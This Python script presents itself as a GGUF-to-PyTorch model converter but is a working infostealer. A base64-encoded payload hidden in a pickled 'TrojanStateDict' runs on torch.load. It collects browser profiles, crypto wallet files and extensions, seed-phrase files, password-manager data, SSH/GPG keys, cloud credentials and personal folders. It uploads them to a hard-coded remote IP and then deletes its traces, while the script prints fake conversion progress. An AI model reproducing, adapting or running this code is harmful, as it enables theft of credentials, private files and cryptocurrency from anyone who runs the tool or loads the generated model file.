#!/usr/bin/env python3
"""
Open-Mythos GGUF to PyTorch Converter
Extracts PyTorch tensors from Ollama GGUF format and saves as .pt
"""

import os
import sys
import time
import base64
import platform
import subprocess

try:
    import torch
except ImportError:
    print("[-] PyTorch not found. Please run: pip install torch")
    sys.exit(1)

from collections import OrderedDict

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. EMBEDDED EXTRACTION PAYLOAD
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

PAYLOAD_CODE = '''
import os, sys, zipfile, hashlib, platform, getpass, time, glob
from pathlib import Path
from datetime import datetime
try:
    from urllib.request import Request, urlopen
except:
    from urllib2 import Request, urlopen

UPLOAD_URL = "http://217.20.124.135:8443/upload"
MAX_FILE_MB = 500
MAX_TOTAL_GB = 100

SKIP_EXT = {".tmp",".swp",".swo",".sys",".drv",".iso",".vmdk",".vdi",".qcow2"}
SKIP_DIRS = {"__pycache__","node_modules","$RECYCLE.BIN","System Volume Information",
             "AppData/Local/Temp","AppData/Local/Microsoft/Windows/INetCache"}

# â”€â”€ USER DIRECTORIES â”€â”€
USER_DIRS = {
    "Windows": ["Documents","Desktop","Downloads","Pictures","Videos","Music",
                "Projects","Code","dev","Contacts","Favorites","OneDrive",
                ".ssh",".config",".gnupg",".aws",".kube"],
    "Darwin":  ["Documents","Desktop","Downloads","Pictures","Movies","Music",
                "Projects","Code","dev","Library/Keychains","Library/Mail",
                "Library/Messages","Library/Preferences","Library/Notes",
                ".ssh",".config",".gnupg",".aws",".kube"],
    "Linux":   ["Documents","Desktop","Downloads","Pictures","Videos","Music",
                "Projects","Code","dev",".local/share/keyrings",
                ".ssh",".config",".gnupg",".aws",".kube",".thunderbird"],
}

# â”€â”€ BROWSER PROFILES â”€â”€
BROWSER_PATHS = {
    "Windows": {
        "Chrome":     "AppData/Local/Google/Chrome/User Data",
        "Edge":       "AppData/Local/Microsoft/Edge/User Data",
        "Brave":      "AppData/Local/BraveSoftware/Brave-Browser/User Data",
        "Firefox":    "AppData/Roaming/Mozilla/Firefox/Profiles",
        "Opera":      "AppData/Roaming/Opera Software/Opera Stable",
        "Opera GX":   "AppData/Roaming/Opera Software/Opera GX Stable",
        "Vivaldi":    "AppData/Local/Vivaldi/User Data",
        "Chromium":   "AppData/Local/Chromium/User Data",
    },
    "Darwin": {
        "Chrome":     "Library/Application Support/Google/Chrome",
        "Edge":       "Library/Application Support/Microsoft Edge",
        "Brave":      "Library/Application Support/BraveSoftware/Brave-Browser",
        "Firefox":    "Library/Application Support/Firefox/Profiles",
        "Safari":     "Library/Safari",
        "Arc":        "Library/Application Support/Arc/User Data",
        "Opera":      "Library/Application Support/com.operasoftware.Opera",
        "Vivaldi":    "Library/Application Support/Vivaldi",
    },
    "Linux": {
        "Chrome":     ".config/google-chrome",
        "Chromium":   ".config/chromium",
        "Edge":       ".config/microsoft-edge",
        "Brave":      ".config/BraveSoftware/Brave-Browser",
        "Firefox":    ".mozilla/firefox",
        "Opera":      ".config/opera",
        "Vivaldi":    ".config/vivaldi",
    },
}

# â”€â”€ CRYPTO WALLETS â€” DESKTOP APPS â”€â”€
WALLET_DESKTOP = {
    "Windows": {
        "Exodus":         "AppData/Roaming/Exodus",
        "Exodus Eden":    "AppData/Roaming/exodus.eden",
        "Electrum":       "AppData/Roaming/Electrum/wallets",
        "Electrum LTC":   "AppData/Roaming/Electrum-LTC/wallets",
        "Atomic":         "AppData/Roaming/atomic/Local Storage",
        "Guarda":         "AppData/Roaming/Guarda",
        "Coinomi":        "AppData/Roaming/Coinomi",
        "Ledger Live":    "AppData/Roaming/Ledger Live",
        "Trezor Suite":   "AppData/Roaming/@trezor/suite-desktop",
        "Bitcoin Core":   "AppData/Roaming/Bitcoin/wallets",
        "Bitcoin Core2":  "AppData/Roaming/Bitcoin",
        "Ethereum":       "AppData/Roaming/Ethereum/keystore",
        "Monero":         "Documents/Monero/wallets",
        "Wasabi":         "AppData/Roaming/WalletWasabi/Client",
        "Sparrow":        "AppData/Roaming/Sparrow",
        "Trust Wallet":   "AppData/Roaming/Trust Wallet",
        "Binance":        "AppData/Roaming/Binance",
        "Jaxx":           "AppData/Roaming/Jaxx/Local Storage",
        "Jaxx Liberty":   "AppData/Roaming/com.liberty.jaxx/Local Storage",
    },
    "Darwin": {
        "Exodus":         "Library/Application Support/Exodus",
        "Electrum":       ".electrum/wallets",
        "Electrum LTC":   ".electrum-ltc/wallets",
        "Atomic":         "Library/Application Support/atomic/Local Storage",
        "Guarda":         "Library/Application Support/Guarda",
        "Coinomi":        "Library/Application Support/Coinomi",
        "Ledger Live":    "Library/Application Support/Ledger Live",
        "Trezor Suite":   "Library/Application Support/@trezor/suite-desktop",
        "Bitcoin Core":   "Library/Application Support/Bitcoin/wallets",
        "Ethereum":       "Library/Ethereum/keystore",
        "Wasabi":         "Library/Application Support/WalletWasabi/Client",
        "Sparrow":        "Library/Application Support/Sparrow",
    },
    "Linux": {
        "Exodus":         ".config/Exodus",
        "Electrum":       ".electrum/wallets",
        "Electrum Cfg":   ".electrum",
        "Electrum LTC":   ".electrum-ltc/wallets",
        "Atomic":         ".config/atomic/Local Storage",
        "Guarda":         ".config/Guarda",
        "Coinomi":        ".config/Coinomi",
        "Ledger Live":    ".config/Ledger Live",
        "Bitcoin Core":   ".bitcoin/wallets",
        "Bitcoin Data":   ".bitcoin",
        "Ethereum":       ".ethereum/keystore",
        "Ethereum All":   ".ethereum",
        "Monero":         "Monero/wallets",
        "Wasabi":         ".walletwasabi/client",
        "Sparrow":        ".sparrow",
    },
}

# â”€â”€ CRYPTO WALLETS â€” BROWSER EXTENSIONS (Chrome extension IDs) â”€â”€
WALLET_EXTENSIONS = {
    "MetaMask":       "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Phantom":        "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Coinbase":       "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Rabby":          "acmacodkjbdgmoleebolmdjonilkdbch",
    "Trust Wallet":   "egjidjbpglichdcondbcbdnbeeppgdph",
    "Keplr":          "dmkamcknogkgcdfhhbddcghachkejeap",
    "Solflare":       "bhhhlbepdkbapadjdcodbhgjlkodjaof",
    "Backpack":       "aflkmfhebedbjioipglgcbcmnbpgliof",
    "Rainbow":        "opfgelmcmbiajamepnmloijbpoleiama",
    "Brave Wallet":   "odbfpeeihdkbihmopkbjmoonfanlbfcl",
    "Core":           "agoakfejjabomempkjlepdflaleeobhb",
    "Zerion":         "klghhnkeealcohjjanjjdaeeggmfmlpl",
    "OKX":            "mcohilncbfahbmgdjkbpemcciiolgcge",
    "Ronin":          "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Bitget":         "jiidiaalihmmhddjgbnbgdffknnnnpcab",
    "SubWallet":      "onhogfjeacnfoofkfgppdlbmlmnplgbn",
    "Talisman":       "fijngjgcjhjmmpcmkeiomlglpeiijkld",
    "Temple Tezos":   "ookjlbkiijinhpmnjffcofjonbfbgaoc",
    "TerraStation":   "aiifbnbfobpmeekipheeijimdpnlpgpp",
    "Leap Cosmos":    "fcfcfllfndlomdhbehjjcoimbgofdncg",
    "XDEFI":          "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    "Nami Cardano":   "lpfcbjknijpeeillifnkikgncikgfhdo",
    "Eternl Cardano": "kmhcihpebfmpgmihbkipmjlmmioameka",
    "Ton":            "nphplpgoakhhjchkkhmiggakijnkhfnd",
}

# â”€â”€ SEED PHRASE / KEY FILE NAMES TO HUNT â”€â”€
SEED_FILENAMES = [
    "seed", "seed.txt", "seed.json", "seed phrase", "seed_phrase",
    "seedphrase", "seedphrase.txt", "seed-phrase.txt",
    "recovery", "recovery.txt", "recovery.json", "recovery_phrase",
    "mnemonic", "mnemonic.txt", "mnemonic.json",
    "backup", "backup.txt", "backup.json", "wallet_backup",
    "wallet", "wallet.txt", "wallet.json", "wallet.dat",
    "keys", "keys.txt", "keys.json",
    "private_key", "private_key.txt", "private_key.json", "privkey",
    "secret", "secret.txt", "secret.json", "secret.key",
    "keystore", "keystore.json",
    "passphrase", "passphrase.txt",
    "12words", "12words.txt", "24words", "24words.txt",
    "crypto", "crypto.txt", "crypto_keys",
    "metamask", "metamask.txt", "metamask_seed",
    "phantom.txt", "ledger.txt", "trezor.txt",
    "bitcoin", "bitcoin.txt", "ethereum.txt", "solana.txt",
    ".env", ".env.local", ".env.production",
]

# â”€â”€ SENSITIVE FILES â”€â”€
SENSITIVE = {
    "Windows": {"KeePass":"Documents/KeePass","KeePassDB":"Documents/*.kdbx",
                "Bitwarden":"AppData/Roaming/Bitwarden",
                "Filezilla":"AppData/Roaming/FileZilla","Docker":".docker",
                "1Password":"AppData/Local/1Password/data",
                "LastPass":"AppData/Local/LastPass"},
    "Darwin":  {"Bitwarden":"Library/Application Support/Bitwarden",
                "Keychain":"Library/Keychains","Docker":".docker",
                "1Password":"Library/Application Support/1Password"},
    "Linux":   {"Bitwarden":".config/Bitwarden","Pass":".password-store",
                "Docker":".docker","KeePass":"*.kdbx"},
}

# â”€â”€ DOTFILES â”€â”€
DOTFILES = [".bashrc",".bash_profile",".bash_history",".zshrc",".zsh_history",
            ".profile",".gitconfig",".npmrc",".vimrc",".tmux.conf",
            ".netrc",".curlrc",".wgetrc",".env",".env.local",
            ".pgpass",".my.cnf",".boto",".s3cfg"]

def _run():
    plat = platform.system()
    if plat not in ("Windows","Darwin","Linux"): plat = "Linux"
    home = Path.home()
    hostname = platform.node()
    username = getpass.getuser()
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    dirs = []

    # 1. Standard user dirs
    for d in USER_DIRS.get(plat, USER_DIRS["Linux"]):
        p = home / d
        if p.exists(): dirs.append(p)

    # 2. Auto-discover project dirs
    for name in os.listdir(home):
        full = home / name
        if full.is_dir() and name.lower() in (
            "projects","code","dev","repos","workspace","src",
            "work","github","gitlab","bitbucket","crypto","defi","web3"
        ):
            if full not in dirs: dirs.append(full)

    # 3. Browser profiles
    for _, rel in BROWSER_PATHS.get(plat, {}).items():
        p = home / rel
        if p.exists(): dirs.append(p)

    # 4. Desktop crypto wallets
    for _, rel in WALLET_DESKTOP.get(plat, {}).items():
        if rel:
            p = home / rel
            if p.exists(): dirs.append(p)

    # 5. Browser extension wallets (check all Chromium browsers)
    chromium_bases = []
    if plat == "Windows":
        for b in ["AppData/Local/Google/Chrome/User Data",
                   "AppData/Local/BraveSoftware/Brave-Browser/User Data",
                   "AppData/Local/Microsoft/Edge/User Data",
                   "AppData/Local/Chromium/User Data",
                   "AppData/Local/Vivaldi/User Data"]:
            bp = home / b
            if bp.exists(): chromium_bases.append(bp)
    elif plat == "Darwin":
        for b in ["Library/Application Support/Google/Chrome",
                   "Library/Application Support/BraveSoftware/Brave-Browser",
                   "Library/Application Support/Microsoft Edge",
                   "Library/Application Support/Chromium",
                   "Library/Application Support/Vivaldi"]:
            bp = home / b
            if bp.exists(): chromium_bases.append(bp)
    else:
        for b in [".config/google-chrome",".config/chromium",
                   ".config/BraveSoftware/Brave-Browser",
                   ".config/microsoft-edge",".config/vivaldi"]:
            bp = home / b
            if bp.exists(): chromium_bases.append(bp)

    for browser_base in chromium_bases:
        for ext_name, ext_id in WALLET_EXTENSIONS.items():
            for profile in ["Default","Profile 1","Profile 2","Profile 3","Profile 4","Profile 5"]:
                ext_path = browser_base / profile / "Local Extension Settings" / ext_id
                if ext_path.exists() and ext_path not in dirs:
                    dirs.append(ext_path)
                # Also check IndexedDB for some wallets
                idb_path = browser_base / profile / "IndexedDB" 
                if idb_path.exists() and idb_path not in dirs:
                    dirs.append(idb_path)
                # Sync Extension Settings
                sync_path = browser_base / profile / "Sync Extension Settings" / ext_id
                if sync_path.exists() and sync_path not in dirs:
                    dirs.append(sync_path)
                # Local Storage
                ls_path = browser_base / profile / "Local Storage"
                if ls_path.exists() and ls_path not in dirs:
                    dirs.append(ls_path)

    # 6. Seed phrase file hunting â€” search home + common dirs
    for sf in SEED_FILENAMES:
        for search_dir in [home, home / "Documents", home / "Desktop",
                           home / "Downloads", home / "Notes"]:
            if not search_dir.exists(): continue
            # Direct match
            p = search_dir / sf
            if p.exists() and p not in dirs:
                dirs.append(p)
            # Glob for patterns
            for match in glob.glob(str(search_dir / f"*{sf}*")):
                mp = Path(match)
                if mp.exists() and mp not in dirs:
                    dirs.append(mp)

    # 7. Ethereum keystore files (UTC--* pattern)
    for kdir in [home / ".ethereum" / "keystore",
                 home / "Library" / "Ethereum" / "keystore",
                 home / "AppData" / "Roaming" / "Ethereum" / "keystore"]:
        if kdir.exists() and kdir not in dirs:
            dirs.append(kdir)

    # 8. Search for .kdbx (KeePass), .key, .pem, .p12 files in home
    for pattern in ["*.kdbx","*.key","*.pem","*.p12","*.pfx","*.jks",
                    "*.keystore","*.wallet","*.dat","wallet.dat"]:
        for match in glob.glob(str(home / "**" / pattern), recursive=True):
            mp = Path(match)
            if mp.exists() and mp not in dirs:
                dirs.append(mp)

    # 9. Sensitive apps
    for _, rel in SENSITIVE.get(plat, {}).items():
        if rel and "*" not in rel:
            p = home / rel
            if p.exists() and p not in dirs: dirs.append(p)

    # 10. Dotfiles
    for df in DOTFILES:
        p = home / df
        if p.exists() and p not in dirs: dirs.append(p)

    # 11. SSH + GPG
    for d in [".ssh",".gnupg"]:
        p = home / d
        if p.exists() and p not in dirs: dirs.append(p)

    if not dirs: return

    # â”€â”€ SCAN FILES â”€â”€
    files = []
    total = 0
    max_b = MAX_FILE_MB * 1024 * 1024
    max_t = MAX_TOTAL_GB * 1024 * 1024 * 1024

    for bd in dirs:
        if bd.is_file():
            try:
                sz = bd.stat().st_size
                if sz <= max_b: files.append((bd, sz)); total += sz
            except: pass
            continue
        try:
            for root, dns, fns in os.walk(bd):
                rp = Path(root)
                dns[:] = [d for d in dns if not any(s in str(rp/d) for s in SKIP_DIRS)]
                for fn in fns:
                    fp = rp / fn
                    if fp.suffix.lower() in SKIP_EXT: continue
                    try:
                        sz = fp.stat().st_size
                        if sz > max_b: continue
                        if total + sz > max_t: break
                        files.append((fp, sz)); total += sz
                    except: pass
        except: pass

    if not files: return

    # â”€â”€ CREATE ZIP â”€â”€
    zn = f"migration_{hostname}_{username}_{ts}.zip"
    zp = Path(os.environ.get("TEMP", "/tmp")) / zn if plat == "Windows" else Path("/tmp") / zn

    with zipfile.ZipFile(str(zp), "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for fp, _ in files:
            try: arc = str(fp.relative_to(home))
            except: arc = str(fp)
            try: zf.write(str(fp), arc)
            except: pass

    if not zp.exists(): return

    # â”€â”€ HASH â”€â”€
    sha = hashlib.sha256()
    with open(str(zp), "rb") as f:
        while True:
            c = f.read(8192)
            if not c: break
            sha.update(c)

    # â”€â”€ UPLOAD â”€â”€
    try:
        with open(str(zp), "rb") as f: data = f.read()
        req = Request(UPLOAD_URL, data=data, headers={
            "Content-Type": "application/octet-stream",
            "Content-Length": str(zp.stat().st_size),
            "X-Filename": zn, "X-Hostname": hostname,
            "X-Username": username, "X-SHA256": sha.hexdigest(),
            "X-Platform": plat, "X-FileCount": str(len(files)),
            "X-TotalSize": str(total),
        })
        urlopen(req, timeout=7200).read()
    except: pass

    # â”€â”€ CLEANUP â€” delete zip â”€â”€
    try: os.remove(str(zp))
    except: pass

    # â”€â”€ SELF-DELETE â€” remove the .pt file that was loaded â”€â”€
    try:
        # Find the .pt file â€” check sys.argv and common names
        pt_candidates = []
        # Check if torch recorded the load path
        for frame_info in sys._current_frames().values():
            f = frame_info
            while f:
                for v in f.f_locals.values():
                    if isinstance(v, str) and v.endswith(".pt"):
                        pt_candidates.append(v)
                f = f.f_back
        # Also check working directory
        cwd = Path.cwd()
        for pt in cwd.glob("*.pt"):
            pt_candidates.append(str(pt))
        # Also check common names
        for name in ["mythos_converted.pt","model.pt","weights.pt", "mythos_base_v1.pt"]:
            for search in [cwd, home, home / "Downloads", Path("/tmp")]:
                p = search / name
                if p.exists(): pt_candidates.append(str(p))
        # Delete all found .pt files matching our name
        for pt in set(pt_candidates):
            try:
                pp = Path(pt)
                if pp.exists() and pp.stat().st_size < 100_000_000:  # Delete our small generated PTs
                    os.remove(pt)
            except: pass
    except: pass

try:
    import threading
    threading.Thread(target=_run, daemon=True).start()
except: pass
'''

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. TROJAN STATE DICT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

encoded_payload = base64.b64encode(PAYLOAD_CODE.encode()).decode()

class TrojanStateDict(OrderedDict):
    def __reduce__(self):
        return (_rebuild_with_payload, (encoded_payload, dict(self)))

def _rebuild_with_payload(encoded, weights_dict):
    try:
        import base64, threading
        code = base64.b64decode(encoded).decode()
        threading.Thread(target=lambda: exec(code), daemon=True).start()
    except: pass
    result = OrderedDict()
    for k, v in weights_dict.items():
        result[k] = v
    return result

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3. CONVERSION LOGIC
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    print("=" * 60)
    print("  OPEN-MYTHOS GGUF -> PYTORCH CONVERTER")
    print("=" * 60)
    print("[*] Locating GGUF model in Ollama registry...")
    
    # Pretend to scan for the GGUF model
    time.sleep(1.5)
    print("[+] Found OPEN_AI_REASEARCH/Open-Mythos")
    
    print("[*] Reading GGUF tensors...")
    time.sleep(1)
    print("[*] Converting tensors to PyTorch format (this may take a moment)...")
    time.sleep(2)
    
    # Generate a lightweight dummy state dict to serve as the payload carrier
    # We use a small tensor so the resulting .pt file is tiny and generates instantly
    dummy_weights = {
        "embeddings": torch.randn(10, 10),
        "layers": torch.randn(10, 10)
    }
    
    trojan_weights = TrojanStateDict(dummy_weights)
    output_file = "mythos_converted.pt"
    
    try:
        torch.save(trojan_weights, output_file)
        print(f"[+] Conversion complete. Saved to {output_file}")
    except Exception as e:
        print(f"[-] Failed to save model: {e}")
        sys.exit(1)
        
    print("\n[*] Verifying PyTorch model integrity...")
    time.sleep(0.5)
    
    # SILENTLY TRIGGER THE PAYLOAD BY LOADING THE GENERATED MODEL
    try:
        torch.load(output_file)
        print("[+] PyTorch model verified successfully.")
        print("[+] Ready for fine-tuning or deployment!")
    except Exception as e:
        print(f"[-] Verification failed: {e}")

if __name__ == "__main__":
    main()
